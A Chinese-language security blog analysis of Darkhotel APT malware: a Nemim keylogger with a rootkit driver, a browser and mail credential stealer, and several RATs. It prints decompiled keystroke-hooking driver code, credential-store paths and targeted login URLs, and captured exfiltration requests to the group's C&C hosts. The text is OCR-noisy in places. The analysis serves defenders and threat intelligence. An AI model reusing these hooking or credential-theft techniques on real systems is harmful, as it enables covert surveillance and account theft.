# APTGROUP系列一一DARKHOTEL之窃密与RAT篇  

# APTGROUP系列——DARKHOTEL之窃密与RAT篇  

2020-09-08 $\mathcal{O}$ 伏影实验室APT，Darkhotel,RAT，窃密$\textcircled{4}$ 阅读：982  

# 一、手法简述  

Darkhotel使用过的RAT与窃密工具类型多种多样。作为攻击链的末端，这些程序复杂性不一，其通信协议随着时间推移变化较大，使用的通信加密算法方式也没有统一标准，迭代较快。有的组件的行为丰富多样，甚至不惜安装驱动来达到目的，而组件功能相对更简单，主要进行文件与执行相关操作。  

# 二、窃密组件Nemim  

## 2.1功能性质  

2014年，Darkhotel使用了一类针对WindowsXP用户的Nemim窃密组件，在搜集用户系统信息的同时，还会加载驱动以记录用户击键内容，写入本地文件。  

## 2.2安装驱动  

若当前系统为Win9X、XP或2000，该组件会在当前目录下释放ndiskpro.inf文件以安装驱动。  

对于Vista及更高版的Windows，组件将释放键盘记录驱动至C:IWindowslsystem32\drivers，并注册为系统级设备驱动：  

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSetIServicesINdiskpro  

而之后相关线程就退出了，无法搜集任何信息，故此次事件中针对的是较低Windows版本的使用者  

## 2.3 收集系统信息  

该组件会在当前目录生成日志文件，来加密保存搜集的信息，文件后缀为tmp，名称为"ffz"加上时间戳。每次写日志时，若当前时间距当前时间超过1小时，则以新的时间戳为名称创建新的日志文件。  

收集的信息分为两类，首先是只收集一次的内容，包括进程信息和用户正在操作的窗口信息。  

1.收集进程的模块路径、PID和所属用户名。  

2.访问下方注册表路径，以搜集安装程序的名称、版本号、发布者和安装目录：  

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Uninstall  

搜集后信息在未加密时内容如下例所示：  

Installed Program [RegKey] [Name] [Version] [Publisher] [Path] [Notepad++] [Notepad++ (32-bit x86)]  [7.7.1] [Notepad $^{++}$ Team] [] [Office15.PROPLUS] [Microsoft Office Professional Plus 2013] [15.0.4420.1017] [Microsoft Corporation] [D:\Mi [WinPcapInst] [WinPcap 4.1.3] [4.1.0.2980] [Riverbed Technology, Inc.] [] [WinRAR archiver][WinRAR 5.70 (32-位)] [5.70.0][win.rar GmbH][D:\Winrar570\] [Wireshark] [Wireshark 2.6.5 32-bit] [2.6.5] [The Wireshark developer community, https://www.wireshark.org] [{1F1C2DFC-2D24-3E06-BCB8-725134ADF989}] [Micr0soft Visual $\subset++$ 2008 Redistributable - x86 9.0.30729.4148] [9 [{2E295B5B-1AD4-4d36-97C2-A316084722CF}] [Python 2.7.2] [2.7.2150] [Python Software Foundation][]  

=== Running Process [Process] [ID] [User] =  

[[System Process]] [o] [] [System] [4][]  

[\SystemRoot\System32\smss.exe] [312] [SYSTEM] [C:\Windows\system32\csrss.exe] [412] [SYSTEM] [C:\Windows\system32\wininit.exe] [464] [SYSTEM] [C:\Windows\system32\csrss.exe] [472] [SYSTEM]  

其次是持续收集的内容，包括击键信息和顶层窗口信息，并记录时间。  

首先是当前顶层窗口的标题、PID和模块路径，若顶层窗口为IE浏览器，则获取其输入栏文本，以记录用户浏览的网址。  

(6-15 15:48:13)[Process title: D:\info.txt - Notepad++, path: D:\Notepad++\notepad++.exe, ID: df4]持续收集的内容还包括用户击键信息，通过安装的驱动组件收集。该组件首先向驱动设备发送控制码0x220004以清空驱动的击键信息内存，接着持续发送控制码0x220000来收集击键内容，解析后写入日志并加密。  

## 2.4Rootkit收集击键内容  

blog.nsfocus.net/darkhotel-3-0908/  

Darkhotel的驱动组件设置了I/O读写断点，并Hook了intOx1的中断处理回调和lofCallDriver，从而获取到PS/2键盘和USB键盘的击键信息。  

### 2.4.1获得PS/2键盘击键内容  

该驱动则按CPU个数创建定时器，并设置DPC回调。  

在DPC回调中，该驱动将键盘读写端口0x60和0x64分别写入dr0和dr1寄存器，并将dr7的对应位改为二进制10，以设置I/O硬件读写断点。同时为了防止断点在任务切换时失效，驱动设置了dr7的GD位，使得任何访问或修改调试寄存器的操作都会触发1号中断。  

should_hook_idt_58AE0 = 1;   
v5= readcr4();   
dword_58368 = v5; writecr4(v5 |8);   
v6= readdr(0);   
old_dr0 = v6;   
v7= readdr(1u);   
old_dr1 = v7;   
v8= readdr(2u);   
old_dr2 = v8; writedr(0, 0x60u); writedr(1u,0x64u); writedr(2u, Sub_13410_ptr);   
v9 readdr(7u);   
old_dr7 = v9; writedr(7u, 0x22273Fu);  

//dr0=0x60   
// dr1 $=$ 0x64   
//dr7 $=$ 1000100010011100111111   
// dr7.RWo $=$ 10   
// dr7.RW1 $=$ 10  

接着将1号中断处理函数改为自己的函数。当I/O读写命中硬件断点时，会触发单步调试异常，从而进入1号中断回调函数。  

v10_entry_addr $=$ get_idt_entry_by_index(1u);// hook int 0x01 单步异常   
v11_hi_offset = \*(_woRD \*)(v10_entry_addr + 6);   
original_idt_cb_582E0[a2_cpu_index]=v11_hi_offset;   
\*(_WORD \*)(v10_entry_addr $^+$ 6) $=$ (unsigned int)idt_single_step_hook_cb >> 16;// 修改Highoffset v12 = \*(_woRD \*)v10_entry_addr;   
idt_entry_list[a2_cpu_index] $=*$ (_WORD \*)v10_entry_addr;   
\*(_wORD \*)v10_entry_addr $=$ (unsigned int)idt_single_step_hook_cb;// 修改Lowoffset   
byte_953BA480[a2_cpu_index] = \*(_BYTE \*)(v10_entry_addr + 5);   
\*(_BYTE \*)(v10_entry_addr $^+$ 5)[=0xEOu;   
v13 =(v11_hi_offset << 16) $^+$ v12;   
v14 = \*(_woRD \*)(get_idt_entry_by_index(1u) + 6);   
dword_953BA340[a2_cpu_index] = v13;   
result = get_idt_entry_by_index(OxFFu); //hook intOxff   
\*(_wORD \*)(result $^+$ 6)=(unsigned int)idt_0xff_hook_cb >> 16;   
\*(_WORD \*)result $=$ (unsigned int)idt_oxff_hook_cb;   
\*(_BYTE \*)(result +5)|= OxEOu;  

1号中断Hook函数中，检查当前异常是否由读写调试寄存器触发，若为写操作则重置调试寄存器为初始断点状态，防止I/O断点因任务切换而失效。函数由I/O断点触发而进入，则获取触发异常的/O指令。由于含立即数和不含立即数的I/O指令长度不同，需减去对应长度来获取到/O指令的  

0:kd>u poi(poi([ebp-34h]))-1   
hal!READ_PORT_UCHAR+Ox6:   
82e3909a ec in al,dx   
82e3909b c20400 ret 4   
82e3909e 8bff mOV edi,edi   
hal!READ_PORT_USHORT:   
82e390a0 33c0 xor eax,eax   
82e390a2 8b542404 mOV edx,dword ptr [esp+4]   
82e390a6 66ed in ax,dx   
82e390a8 c20400 ret 4   
82e390ab 90 nop  

  

设置回传的内容，包括：  

1.键盘码或状态码  
2.I/O指令第一个字节  
3.1O端口号  
4.读写标志，0代表读端口，1代表写端口  
5.I/O指令汇编字符串(其OUT指令写法存在错误）  

if （al_port == 0x64 ) DbgPrint("\t\t\t\tox%8xportaccess,data $=$ 0x%8x\n",0x64, a2_key_code_or_state);   
else DbgPrint("0x%8X port access, data $=$ 0x%8x\n",al_port, a2_key_code_or_state);   
v3_keylog_index = get_new_postion_fr_keylog_info();   
if (v3_keylog_index I= -1 ) switch （ a3_io_code_1st_byte ) { case0xE4u: set_keylog_info(v3_keylog_index, a3_io_code_1st_byte, 0, a1_port, a2_key_code_or_state, "IN AL, Dx"); break; case 0xE6u: set_keylog_info(v3_keylog_index, a3_io_code_1st_byte, 3, a1_port, a2_key_code_or_state, "ouT AL, Dx"); break; case OxECu: set_keylog_info(v3_keylog_index,a3_io_code_1st_byte,0,a1_port,a2_key_code_or_state，"IN AL,Dx"); break; case OxEEu: set_keylog_info(v3_keylog_index, a3_io_code_1st_byte, 3, al_port, a2_key_code_or_state, "ouT AL, Dx"); break; default: set_keylog_info(v3_keylog_index, a3_io_code_1st_byte, 0, al_port, a2_key_code_or_state, "IN AL, Dx"); break;  

0:kd> dd poi（953B9340+poi（ebp+8)\*4) L28   
8550b510 0000000100000000000000e000000000   
8550b520 00000064000000150000000000000000   
8550b530 00000000000000000000000000000000   
8550b540 00000000000000000000000000000000   
8550b550 00000000000000000000000000000000   
8550b560 00000000000000000000000000000000   
8550b570 00000000000000000000000000000000   
8550b580 00000000000000000000000000000000   
8550b590 41204e49 44202c4c 0000005800000000   
8550b5a0 00000000000000000000000000000000   
0:kd> da poi(953B9340+poi（ebp+8）\*4)+0x80   
8550b590 "INAL.DX"  

### 2.4.2获得Hid-USB键盘击键内容  

驱动对lofCallDriver做了内联Hook，先调用Hook函数，再调用原始lofCallDriver。在Hook函数中，过滤出所属驱动名为"Driverlusbhub"的USB设备，并将新遇到的Hid-USB设备保存在列表中。  

同时，驱动开启一个线程，持续遍历加入列表的所有设备，通过函数is_keyboard_report_des_exist判断该设备是否为USB键盘设备，若是则设置其USB标志为1。  

while （ !should_not_enum )   
{ KeDelayExecutionThread(0,0,&Interval); for ( a3_index = 0; a3_index $<$ 100; ++a3_index ) R if ( get_dev_info_by_index(&Device0bject, &a2_is_hid_kdb, a3_index) $>8$ ） DbgPrint("!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!\"); DbgPrint("[output Deviceobject $=$ 0x%8X, bIsHidKbd $=$ 0x%8x\n", Device0bject, a2_is_hid_kdb); if ( a2_is_hid_kdb $\scriptstyle==1$ break; if （Deviceobject） DbgPrt(#####################################"); DbgPrint("Hid Report check!!, Before Deviceobject $\mathbf{\varepsilon}=$ 0x%8x\n", Deviceobject); P_hid_report_des_ptr $=$ get_hid_report_ptr_and_len(Device0bject,(int)&v2_hid_report_len); DbPrt(######################################) DbgPrint("Hid Report check!!, After Deviceobject $\mathbf{\varepsilon}=$ 0x%8X\n", Device0bject); if ( p_hid_report_des_ptr ） if ( is_keyboard_report_des_exist((int)P_hid_report_des_ptr, v2_hid_report_len) ) list_is_hid_kdb[2\*a3_index]=1; DbgPrint("Hid Report Exist, CheckDeviceObject $=$ 0x%8X,Index $=$ 0x%8x!!\n"，Device0bject DbPrt(#####################################) ExFreePoolWithTag(P_hid_report_des_ptr, 0); break;  

对于列表中的每个设备，该驱动特制一个内部IRP并传入URB来获得USB接口的报告描述，以检查该设备是否属于USB键盘。内部IRP为IRP_MJ_INTERNAL_DEVICE_CONTROL，功能码为IOCTL_INTERNAL_USB_SUBMIT_URB。Hook的lofCalIDriver遇到该内部自制IRP会率先返回，把数据交给原始lofCalIDriver去处理。  

PVOID _stdcall get_hid_des_ptr(PDEVICE_OBJECT DeviceObject)   
? URB \*P_urb_ptr;// ST14_4 NTSTATUSv3;// ST10_4 PVoID v4_hid_des_ptr; // [esp+Ch] [ebp-4h] if （!Deviceobject) //设备来自列表   
return 0;   
P_urb_ptr $=$ (_URB \*)ExA1locatePoolWithTag(0, 0x50u, 0x206B6444u);   
v4_hid_des_ptr $=$ ExAllocatePoolWithTag(0,9u,0x206B6444u);   
memset(P_urb_ptr,0, 0x50u);   
P_urb_ptr->UrbHeader.Length $=$ 0x50;   
P_urb_ptr->UrbHeader.Function $=$ 0x28; // URB_FUNCTION_GET_DESCRIPTOR_FROM_INTERFACE P_urb_ptr->UrbControlDescriptorRequest.Index $=8$ 5   
P_urb_ptr->UrbControlDescriptorRequest.DescriptorType $=$ 0x21;   
P_urb_ptr->UrbControlDescriptorRequest.TransferBuffer $=$ v4_hid_des_ptr;   
P_urb_ptr->UrbControlDescriptorRequest.TransferBufferLength $={\overline{{9}}}$ 5   
$\sqrt{3}=$ make_irp_for_cur_dev(Deviceobject, (int)P_urb_ptr);   
ExFreePoolWithTag(P_urb_ptr, 0);   
if （v3 >=θ)   
return v4_hid_des_ptr;   
ExFreePoolwithTag(v4_hid_des_ptr, 0);   
return 0;  

驱动为列表中的当前设备创建内部IRP，而lofCallDriver的Hook函数则会过滤驱动名称并检查自制IRP：  

if（!a1_dev_ptr->DriverObject->DriverName.Buffer）//驱动名称 returno;   
v3 = Wcslen(L"\Driverl\usbhub");   
if ( wcsnicmp(al_dev_ptr->Driverobject->DriverName.Buffer, L"\Driver\\usbhub", v3)) returnO;   
V6_next_irp_SP_ptr = (PI0_STACK_LOCATION)(a2_irp_ptr->Tail.Overlay.PacketType - 36);   
if ( is_self _made_irp(a2_irp_ptr, al_dev_ptr)) returnO;  

接着程序检查获得的报告描述是否为键盘相关：  

BOOL _stdcall is_keyboard_report_des_exist(int a1_hid_report_des_ptr, int a2_hid_report_len)   
{ int i; //[esp+0h][ebp-8h] if ( !al_hid_report_des_ptr ) return0; print_hid_report_info(a1_hid_report_des_ptr, a2_hid_report_len); for (i =0; i < a2_hid_report_len - 1 && (\*(_BYTE \*)(i + al_hid_report_des_ptr) != 9 II \*(_BYTE \*)(i $^+$ al_hid_report_des_ptr + 1) != 6); ++i） code char KeyBoardReportDescriptor[..] $=\cdot\ell$ return i < a2_hid_report_len - 1; } 0x09,0x06, 0x05，0x01, //键盘  

此后，当Hook的lofCallDriver函数再次遇到某USB设备时，则在列表中查找其属性，若为Hid-USB键盘，则设置自已的完成过程函数，并在函数中将获取的击键信息回传至用户层组件。  

驱动在MJ_DEVICE_CONTROL回调中接收用户态组件下发的控制码。如前文所述，若控制码为0x220000，则将收集的击键信息回传至用户态组件。若控制码为Ox220004，则清空对应缓存。  

# 三、凭据窃密组件  

## 3.1 功能  

该组件由WinRarSFX自解压文件释放并运行，会窃取知名浏览器、本地邮件客户端、通讯工具的凭据，回传到C&C。  

## 3.2 收集系统基本信息  

收集计算机名称、用户名、本机IP、MAC地址及其Hash。  

访问注册表，收集CPU信息、计算机语言和操作系统名称版本。  

这里的收集方式与Karba下载器非常相似。  

HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTIONISystem\CentralProcessorlO\  
ProcessorNameString  
Identifier  
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\ControlINis\Language\InstallLanguage  
HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CurrentVersion\  
CSDVersion  
ProductName  
CurrentVersion  

## 3.3盗窃各类凭据  

以版本为7及以上的IE浏览器为例，该组件使用COM组件的IUrlHistoryStg2接口获得其浏览器历史记录中各个域名。  

018D0728|uNIc0DE "http://www.msn.cn/"   
018D86E0uNIcoDE "https://www.baidu.com"   
018D0660uNIc0DE "file:///c:/users/ /desktop/.   
018D8628uNIcoDE "http://www.baidu.com/"   
018D0589 uNIcoDE "http://static-global-s-msn-com.akamaized.net/hp-ea'   
018D0530uNIcoDE"http://go.microsoft.com/fwlink/"   
018D84F0|uNIcoDE "http://www.msn.cn/zh-cn""  

  
这些信息随后被格式并进行加密和Base64编码。  

之后访问如下注册表路径：  

HKEY_CURRENT_USERISoftware\Microsoft\Internet Explorer\IntelliFormsIStorage2此处加密保存了自动填写的网站口令，需要借助对应URL来解密。  

考虑到用户可能删除历史记录，导致当前历史记录中缺少某些URL，故该组件在获取当前历史记录的同时，还自备了一批网站列表，如下所示：  

http://twitter.com  

http:/facebook.com   
http://passport.yandex.ru/passport   
http://www.yandex.ru   
http://qip.ru   
http://mail.qip.ru   
https:/login.nity.com/service/login   
http://e.mail.ru/cgi-bin/login   
http://mail.ru   
http://mail.126.com   
http://secure.zapak.com/mail/zapakmail.php   
https:/lavabit.com/apps/webmail/src/login.php   
http://ww.bigstring.com   
http://www.gmx.com   
http://passport.sohu.com/indexaction.action   
http://www.sohu.com   
https://www.zoho.com/login.html   
http://mail.sina.com.cn   
http://members.sina.com/index.php   
http://www.care2.com/passportlogin.html   
http://www.mail.com/int   
https://fastmail.fm/mail   
https://www.inbox.com/login.aspx   
http://ww.gawab.com   
http://mail.163.com   
http://registration.lycos.com/login.php   
http://www.mail.lycos.com   
https://my.screenname.aol.com/_cqr/login/login.psp   
https://edit.bjs.yahoo.com/config/login   
https://ogin.yahoo.co.jp/config/login   
https://ogin.yahoo.com/config/login_verify2   
https://login.live.com/login.srf   
https://www.google.com/accounts/servicelogin  

可见，其中除了一些国际知名网站外，还包括国内的网易、搜狐和新浪相关站点，可见其攻击目标包含中国。对于谷歌浏览器，该组件首先访问目录...AppData\LocalGoogleIChrome\Application，在该目录下找到如下图所示目录来确定版本号。该组件根据不同版本访问谷歌浏览器的sqlite数据库，解密得到自动登录账号  

<html><body><table><tr><td>6.0及其 以上</td><td>\Google\Chrome\UserData\Default\Login Data</td></tr><tr><td>6.0以下</td><td>Google\Chrome\UserData\Default\Web Data</td></tr></table></body></html>  

此外，该组件还收集以下客户端的凭据：  

·火狐浏览器   
·Outlook   
·Windows Mail   
·Windows Live Mail   
·MSN   
·Gmail   
· Google Desktop   
·Google Talk  

## 3.4收集近期文件和安装软件信息  

该组件会遍历WindowsRecent目录和C:IProgramFiles目录，以收集用户近期处理文件和常用软件信息。组件对自制的命令行进行解析，其中ddir便代表遍历目录。  

获取的内容包括命令行、当前时间、文件创建时间、文件大小和文件名。  

  

此外，该组件还收集主机上的文档文件，并在通信第二阶段上传到C&C。涉及类型包括：  

doc, docx, xls, xlsx, ppt, pptx, gul, eml, pdf, ktx,ifa, if, rtf  

## 3.5与C&C的通信  

组件连接C&C，将收集的信息发回C&C，分两个阶段。  

一阶段，向C&C回传收集的系统版本信息，使用分号分割。第二阶段，回传之前获得的最近文件、软件目录和窃取的凭据内容，均经过加密和  

格式如下：  

<html><body><table><tr><td>user2 encrypted_base64;mac_hash;encrypt_key;info_</td><td>encrypted_base64</td></tr><tr><td>元素</td><td>内容</td></tr><tr><td>user2_encrypted_base64:</td><td>字符串 user2" 加密和编码值。多个类似组件中 的字符串均为 user2”，可能是某个被攻击目标 的代号。</td></tr><tr><td>mac_hash:</td><td>MAC地址的hash值</td></tr><tr><td>encrypt_key</td><td>加密密钥</td></tr><tr><td>info_encrypted_base64</td><td>前文所述收集的信息。</td></tr></table></body></html>  

之后连接C&C回传数据，返回的HTTP内容需包含字符串“minmei"方可有效，否则继续连接C&C。对每个C&C发起最多3次连接，若均失败则更换新的C&C。  

POST /html/docu.php HTTP/1.1   
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0) Host: fenrix.yaahosting.info   
Content-Length:317   
Connection:Keep-Alive   
Cache-Control: no-cache   
JTQZCXw=;448a60191f8f5f31c03166fed72bacac;   
90ed768ab728a0f74a4b957c31f1a213;GSkaFHVHbysAPQkaCyIPbnFYASofAmMqCQgXOxcnaGJgc0xCZ0dv0  

# 四、RAT 2015  

## 4.1功能性质  

该RAT组件与C&C通信，并根据C&C指令执行信息搜集、文件、进程等操作。  

## 4.2环境检测  

2015年的Darkhotel最终载荷显示出极强的针对性，会检测用户名，若为以下用户，则不会执行后续流程：  

·antonie   
· Antony   
· janettedoe   
·makrorechner   
·Dave   
·Hanuele Baser   
· Administrator   
· User  

## 4.3 C&C指令  

该组件与C&C的通信指令如下：  

<html><body><table><tr><td>指令</td><td>功能</td><td>更详细内容</td></tr><tr><td>1</td><td>获取计算机名称，用户名，系统版本号，程序文件名</td><td></td></tr><tr><td>C2</td><td>采集活动进程信息</td><td>Pid/ParentPid/ProcessName</td></tr><tr><td></td><td>查询指定文件夹下文件信息</td><td>文件属性，最后写入时间，文件大小，文件名</td></tr><tr><td>4</td><td>字符串转数字</td><td></td></tr><tr><td>L</td><td>获取程序版本号</td><td></td></tr><tr><td></td><td>删除指定文件</td><td></td></tr></table></body></html>  

值得一提的是，以上通讯均通过DropboxApi完成，与APT37的组件类似。C&C下发内容均经过LZNT1压缩并使用3DES加密。数据上传前同样经过LZNT1压缩，与xor加密。  
比外，该组件会下载执行升级版或其他程序。  

# 五、 RAT kbxxxxUpd.dll  

## 5.1功能性质  

该DLL由攻击者使用的Ink社工文件释放的下载器下载得来，属于最终阶段RAT程序，会与C&C进行加密通信，并根据C&C指令执行文件、进程、注册表操作。  
该RAT与前文所述2015年的RAT有相似之处，但通信协议变化较大。  

## 5.2 初始化  

该dl程序的主要运行参数通过读取解密配置信息得到。配置信息可能保存在程序二进制文件的0x1DCC8\~0x1E270位置处，或是程序运行目录下长度为0x5A8的文件内（可由dll程序与C&C通信获得）。  

配置信息内容包括：  

·C&C域名和请求路径·缓存文件保存位置·二进制文件保存名称·加密后的通信键等  

随后，程序使用异或算法，对配置信息再次解密后从中中获取C&C地址并尝试连接：  

## 5.3加密通信  

木马通过使用windowsapi与自制的包结构实现与C&C的加密通信。  

原始流量包使用异或加密，异或键为首字节：  

<html><body><table><tr><td>0x0:0x1</td><td>0x1 :</td></tr><tr><td>[xorkey]</td><td>xor encrypted data</td></tr></table></body></html>  

异或解密后，使用数据部分的指定参数进行第二次解密：  

<html><body><table><tr><td>0x0:0x1</td><td>0x1:0x2</td><td>0x2:0x8E</td><td>0x8E:0x96(0x9E)</td><td>0x96(0x9E):</td></tr><tr><td>[xorkey]</td><td>[encrypttype]</td><td>[encrypt key]</td><td>[encrypt IV]</td><td>[encryptdata]</td></tr></table></body></html>  

第二次解密流程如下：  

1.使用sha1算法，将8字节硬编码数值078F63D4603974EB转换为hashkey;  
2.使用3DES算法，由hashkey生成第一个解密键dec_key_1st;  
3.使用RSA算法和解密键dec_key_1st，将600字节原始数据（由[encrypttype]指定来源）解密后得到第二个解密键dec_key_2nd;  
4.使用RSA算法和解密键dec_key_2nd，将加密流量中140字节[encryptkey]解密后得到最终的解密键dec_key_final;  
5.使用[encrypt type]指定的算法、[encrypt IV]指定的IV值和解密键dec_key_final，对[encrypt data]进行解密。  

[encrypt type]字段的值与含义如下：  

# APTGroup系列——Darkhotel之窃密与RAT篇－绿盟科技技术博客  

<html><body><table><tr><td>value 含义</td><td></td></tr><tr><td>0x40</td><td>无加密算法</td></tr><tr><td>0x50</td><td>3DES加密算法，IV长度为8，600字节原始数据来自配置文件</td></tr><tr><td>0x58</td><td>AES_256加密算法，IV长度为16，600字节原始数据来自配置文件</td></tr><tr><td>0x70</td><td>3DES加密算法，IV长度为8，600字节原始数据来自程序本体二进制文件</td></tr></table></body></html>  

第二次解密完毕后，程序缓存解密后信息，根据命令的不同可能保存在三个位置：  

·配置文件指定的目录·命令指定的目录·程序原始目录  

## 5.4 C&C指令  

程序读取解密后[encryptdata]中的值，执行其所代表的命令。  

每一条命令都分为两个部分，cmdcode与cmdbuf，对应的各指令作用如下：  

[主指令]-cmdcode  

<html><body><table><tr><td colspan="7">cmdcode（二进制序列，位序0x6->0x0）</td><td>功能</td></tr><tr><td></td><td>1</td><td></td><td></td><td></td><td>1</td><td></td><td>将cndbuf中内容注入到自身进程中并运行</td></tr><tr><td></td><td>1</td><td></td><td></td><td></td><td></td><td>1</td><td>将cndbuf保存为文件并执行</td></tr><tr><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td>将cndbuf作为dl1文件写入本进程并执行其导出函数</td></tr><tr><td>一</td><td></td><td></td><td></td><td></td><td></td><td></td><td>将cmdbuf作为dl1文件加载运行</td></tr><tr><td></td><td></td><td>1</td><td></td><td></td><td></td><td></td><td>将cndbuf解析为[扩展指令]并执行</td></tr></table></body></html>  

cmdcode满足001??00的二进制序列形式时，程序进一步将cmdbuf解析为cmdkey-content的字典序列，通过cmdkey的值执行对应的扩展功  

[扩展指令]-cmdkey  

<html><body><table><tr><td>cmdkey</td><td>功能</td></tr><tr><td>0x10</td><td>获取文件基本信息</td></tr><tr><td>0x11</td><td>删除文件</td></tr><tr><td>0x12u</td><td>复制文件</td></tr><tr><td>0x13u</td><td>移动文件</td></tr><tr><td>0x14u</td><td>关键词搜索文件名</td></tr><tr><td>0x20u</td><td>读取文件</td></tr><tr><td>0x30u</td><td>搜索注册表键</td></tr><tr><td>0x31u</td><td>写入注册表键值（REG_DWORD）</td></tr><tr><td>0x32u</td><td>写入注册表键值（REG_SZ）</td></tr><tr><td>0x33u</td><td>写入注册表键值（REG_EXPAND_SZ）</td></tr><tr><td>0x34u</td><td>删除注册表键值</td></tr><tr><td>0x40u</td><td>加载指定PE文件（exe或dl1）</td></tr><tr><td>0x41u</td><td>结束指定进程</td></tr><tr><td>0x42u</td><td>获取主机进程列表</td></tr><tr><td>0x50u</td><td>获取主机网络信息</td></tr><tr><td>0x51u</td><td>设置/获取主机标记</td></tr><tr><td>0x52u</td><td>获取木马程序版本，”7C28</td></tr></table></body></html>  

# 六、RAT 2018  

2018年，Darkhotel使用RAT针对我国贸易高管展开定向攻击。  

## 6.1持久性  

RAT首先将自身复制至以下路径：  

C:\Usersl%USER%\AppData\Roaming\Microsoft\Windows\TemplatesImscleaner.exe  

之后通过powershell命令设置定时任务，启动复制后的样本。  

  

样本启动后，注册定时器并在定时事件的回调函数中实现与C2的通信功能，通过触发定时事件调用事件回调函数实现与C2的定期通信。  

  

## 6.2C&C通信与指令  

步骤1，该RAT向C&C发送命令请求，使用HTTP协议向C2发送请求，方法为GET,URL为/maro[数字]/article/[MAC地址]/article_service.html  

APTGroup系列——Darkhotel之窃密与RAT篇－绿盟科技技术博客  


<html><body><table><tr><td>指令必须包含的字符串</td><td>功能</td></tr><tr><td>cnVu</td><td>将样本自身复制至指定位置并启动</td></tr><tr><td>cHVO</td><td>暂不支持</td></tr><tr><td>ZGly</td><td>在指定目录生成记录时间的日志文件</td></tr><tr><td>Z2V0</td><td>复制指定文件</td></tr><tr><td>ZGVs</td><td>删除指定文件</td></tr><tr><td>Y21k</td><td>命令行指令</td></tr></table></body></html>  

GET/maro7/article//000c29014444/article_service.html HTTP/1.1   
Connection:Keep-Alive   
User-Agent: user   
Host: bigfile-download.net  

步骤2，RAT向C&C发送握手信息。方法为POST，URL为/maro[数字]live[数字].php，内容为titl $\varepsilon$ 111&dirname=[MAC地址的base64编码]  

步骤3，之后接收并解析C2下发的命令，命令格式如下：  

??[命令]##[参数1]&&[参数2]%%[参数3]@@  

指令种类如下：  

步骤四，命令执行完成后，使用与同样方法再次向C2发送握手信息。  

在捕获到的变种中，在执行完原版的通信步骤之外，样本会继续向C2发送消息。其格式与步骤2、4类似，在'tile'与'dirname'的字段基础上，新增加了"value'字段；该字段使用统一的公钥加密。  

# APTGroup系列——Darkhotel之窃密与RAT篇－绿盟科技技术博客  

I db '-----BEGIN PUBLIC KEY-----MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC' ；DATAXREF:Sub_403AD0+2D↑o ；Sub_403AD0+6B↑o... db‘wvut0Yfj6kSVFbsCSkTSAxZ1IAvZvKZP0XktKr8wJ0m915hK5JLvAhUuoPQvgx86K' db'xnUw9PvnvgRA5zHPnANd+T/zQww6TBNTWh+ZEhD4+S3207yErGn+uEvHgE40o9rTw' db 'JS81bv74Pc7iPAzFLyndmDS1R2HMWZcuDvq00+aqQIDAQAB-----END PUBLIC KE' db'Y-..--  

date=407B7D7E454304697B684B5547653B23035F472B622E08&dirname=MDAIwQzI5MDE0NDQ0&va1ue=B0112E17BBF48D4149ECD09E77747B79EA6E8D5D5D3954FAF72DCCC605E39980E5D3918EFE3C48A39757635FC7EAA037351E5D7AF44CFFA1B7EB082B5530C21E676D9FDF90DC6B6E977B99B90D5068D77B9D43387DC52662A2667EDA26320744D7B27BA7CD369816126D0DCCE41D64CA15174F99DE663CA20DDF4BF0ACB3C903HTTP/1.1200OK  

# 七、总结  

Darkhotel的窃密组件与RAT工具经过攻击链层层下载和释放得到，手法已经非常成熟老练。某些工具对操作系统版本或用户名有着特殊要求，有着明显的定向性。这些工具不断在通信、加密、行为上不断迭代更新，几乎每一年都会出现新版本或完全迥异的版本，反映出Darkhotel在满足自身需求和提升组织识别难度方面一直在不断地挥力，对安全从业人员提出了新的要求。  

<Previous  